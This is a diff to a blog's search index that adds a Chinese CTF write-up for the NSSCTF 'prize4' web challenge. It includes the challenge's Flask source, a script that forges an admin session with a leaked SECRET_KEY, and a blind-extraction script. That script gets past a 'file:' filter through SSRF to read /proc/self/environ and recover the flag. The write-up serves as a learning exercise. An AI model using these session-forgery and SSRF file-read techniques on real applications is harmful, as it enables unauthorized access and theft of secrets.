@@ -1199,7 +1199,7 @@ public function __toString()&#123;
 <p>这题若是改造之前的强网杯2019随便注一题则可以用此方法。</p>
 ]]></content>
       <categories>
-        <category>CTF·sql盲注</category>
+        <category>CTF·sql</category>
       </categories>
       <tags>
         <tag>buu</tag>
@@ -3352,6 +3352,63 @@ public function __toString()&#123;
 ]]></content>
       <categories>
         <category>SQL-lab</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>NSSCTF-prize4</title>
+    <url>/2022/03/05/2022/3/NSSCTF-prize4/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    尝试做NSS平台上的一道prize题</p>
+<p>​    恰好标签为sql盲注，就通过这道题对盲注加深理解</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305185431322.png" alt="image-20220305185431322"></p>
+<p>打开后是一个输入框</p>
+<p>师傅提示说，看到url就要联想到ssrf</p>
+<p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305185641388.png" alt="image-20220305185641388"></p>
+<p>但从返回的内容来看，这并不是ssrf，因为回显为非管理员的权限</p>
+<p>点击超链接</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getkey</span>():</span><br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;GET&quot;</span>:<br>        session[<span class="hljs-string">&quot;key&quot;</span>]=SECRET_KEY<br></code></pre></td></tr></table></figure>
+
+<p>感觉是flask框架，并且有关键字SECRET_KEY</p>
+<p>这里就是第一个知识点：secret_key伪造session来进行越权</p>
+<p>文章：<a href="https://www.cnblogs.com/Cl0ud/p/12176979.html">secret_key伪造session来进行越权 - 春告鳥 - 博客园 (cnblogs.com)</a></p>
+<p>我们的目标就是伪造出admin的seesion来登录</p>
+<p>回到刚才超链接跳转得到的代码</p>
+<p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305190152366.png" alt="image-20220305190152366"></p>
+<p>师傅是用更换请求方式的方法</p>
+<p>将GET更改为HEAD</p>
+<p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305190637134.png" alt="image-20220305190637134"></p>
+<p>到jwt在线网站解密</p>
+<p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305190708643.png" alt="image-20220305190708643"></p>
+<p>得到key：c5d0ffab-889c-4b55-8595-98872036da0d</p>
+<p>然后挺离谱的，我按照参考文章使用github上的脚本跑的jwt都是错的==</p>
+<p>使用哔哩哔哩视频讲解的脚本</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;6247a6c6-4f64-4a5c-a7c1-adbe29ac445a&#x27;</span><br><br>@app.route(&quot;/&quot;,methods=[&quot;GET&quot;,&quot;POST&quot;])<br>def <span class="hljs-keyword">login</span>():<br>    <span class="hljs-keyword">session</span>[&quot;admin&quot;] = <span class="hljs-keyword">True</span><br>    <span class="hljs-keyword">return</span> request.full_path<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305204836153.png" alt="image-20220305204836153"></p>
+<p>伪造访问成功</p>
+<p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305204906227.png" alt="image-20220305204906227"></p>
+<p>源码扒下来</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, url_for,redirect,render_template_string<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> flag <br><br>SECRET_KEY=str(uuid.uuid4())<br><br>app = Flask(__name__)<br>app.config.update(dict(<br>    SECRET_KEY=SECRET_KEY,<br>))<br><br><span class="hljs-comment">#src in /app</span><br><br><span class="hljs-meta">@app.route(&#x27;/&#x27;)</span><br><span class="hljs-meta">@app.route(&#x27;/index&#x27;,methods=[&#x27;GET&#x27;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(&#x27;/get_data&#x27;, methods=[&quot;GET&quot;,&#x27;POST&#x27;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>():</span><br>    data = request.form.get(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;123&#x27;</span>)<br>    <span class="hljs-keyword">if</span> type(data) <span class="hljs-keyword">is</span> str:<br>        data=data.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>    url = request.form.get(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-string">&#x27;http://127.0.0.1:8888/&#x27;</span>)<br>    <span class="hljs-keyword">if</span> data <span class="hljs-keyword">and</span> url:<br>        session[<span class="hljs-string">&#x27;data&#x27;</span>] = data<br>        session[<span class="hljs-string">&#x27;url&#x27;</span>] = url<br>        session[<span class="hljs-string">&quot;admin&quot;</span>]=<span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;home&#x27;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;/&#x27;</span>))<br><br><span class="hljs-meta">@app.route(&#x27;/home&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">home</span>():</span><br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-literal">False</span>):<br>        <span class="hljs-keyword">return</span> render_template_string(open(__file__).read())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;home.html&quot;</span>,data=session.get(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;Not find data...&#x27;</span>))<br><br><span class="hljs-meta">@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getkey</span>():</span><br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;GET&quot;</span>:<br>        session[<span class="hljs-string">&quot;key&quot;</span>]=SECRET_KEY<br>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&#x27;&#x27;@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-string">def getkey():</span><br><span class="hljs-string">    if request.method != &quot;GET&quot;:</span><br><span class="hljs-string">        session[&quot;key&quot;]=SECRET_KEY&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-meta">@app.route(&#x27;/get_hindd_result&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_hindd_result</span>():</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;data&#x27;</span>] <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;url&#x27;</span>]:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file:&#x27;</span> <span class="hljs-keyword">in</span> session[<span class="hljs-string">&#x27;url&#x27;</span>]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no no no&quot;</span><br>        data=(session[<span class="hljs-string">&#x27;data&#x27;</span>]).decode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>        url_text=urllib.request.urlopen(session[<span class="hljs-string">&#x27;url&#x27;</span>]).read().decode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>        <span class="hljs-keyword">if</span> url_text <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> data <span class="hljs-keyword">in</span> url_text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;you get it&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;what ???&quot;</span><br><br><span class="hljs-meta">@app.route(&#x27;/getflag&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_flag</span>():</span><br>    res = flag.waf(request)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">8888</span>)<br></code></pre></td></tr></table></figure>
+
+<p>视频里atao师傅说看见返回内容的不同要想到布尔盲注</p>
+<p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305205042249.png" alt="image-20220305205042249"></p>
+<p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305210228558.png" alt="image-20220305210228558"></p>
+<p>在get_hindd_result类中可能存在任意文件读取</p>
+<p>file被过滤了，但后面证明大写就可以绕过</p>
+<p>atao师傅的脚本</p>
+<p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305210410183.png" alt="image-20220305210410183"></p>
+<p>我用到的是另一位师傅的脚本</p>
+<p>[<a href="https://www.wolai.com/k1he/pDVkq5wFGEAJYaUgPFKiu5">NSSCTF]prize4(ssrf+盲注) (wolai.com)</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: k1he</span><br><span class="hljs-comment"># @Date:   2021-09-23 09:10:09</span><br><span class="hljs-comment"># @Last Modified by:   k1he</span><br><span class="hljs-comment"># @Last Modified time: 2021-09-27 22:31:49</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28062/get_data&quot;</span><br>letters = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#125;-&#123;&quot;</span><br>flag = <span class="hljs-string">&#x27;NSSCTF&#123;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> letters:<br>        temp_flag = flag + i<br>        print(<span class="hljs-string">&quot;temp_flag:&quot;</span>, temp_flag)  <span class="hljs-comment"># 打印当前跑出的内容</span><br><br>        data = &#123;<span class="hljs-string">&#x27;url&#x27;</span>: <span class="hljs-string">&#x27;FILE:///proc/self/environ&#x27;</span>, <span class="hljs-string">&#x27;data&#x27;</span>: temp_flag, <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;%E6%8F%90%E4%BA%A4&#x27;</span>, &#125;<br>        res = requests.Session()<br>        <span class="hljs-comment">#print(res)</span><br>        res.get(url=url, data=data)  <span class="hljs-comment"># 获取session</span><br><br>        <span class="hljs-comment">#print(str(res.cookies.values())[2:-2])</span><br>        result = requests.get(url=<span class="hljs-string">&quot;http://1.14.71.254:28062/get_hindd_result&quot;</span>,<br>                              cookies=&#123;<span class="hljs-string">&quot;session&quot;</span>: str(res.cookies.values())[<span class="hljs-number">2</span>:<span class="hljs-number">-2</span>]&#125;)<br>        <span class="hljs-comment"># print(result.text)#打印响应内容</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;you get it&quot;</span> <span class="hljs-keyword">in</span> result.text:<br>            flag += i<br>            print(<span class="hljs-string">&quot;flag&quot;</span>, flag)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># NSSCTF&#123;04106186-e3b2-4766-ba0b-0064e4bfd705&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>运行结果截图</p>
+<p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305211153994.png" alt="image-20220305211153994"></p>
+<p>这样就可以得到flag</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题考点为：python、ssrf、布尔盲注、jwt、session伪造请求登录</p>
+<p>布尔盲注和脚本编写是其中较为简单的点</p>
+<p>关注下这位师傅的博客：<a href="http://www.k1he.cn/">k1he</a></p>
+]]></content>
+      <categories>
+        <category>CTF·sql盲注</category>
       </categories>
   </entry>
 </search>
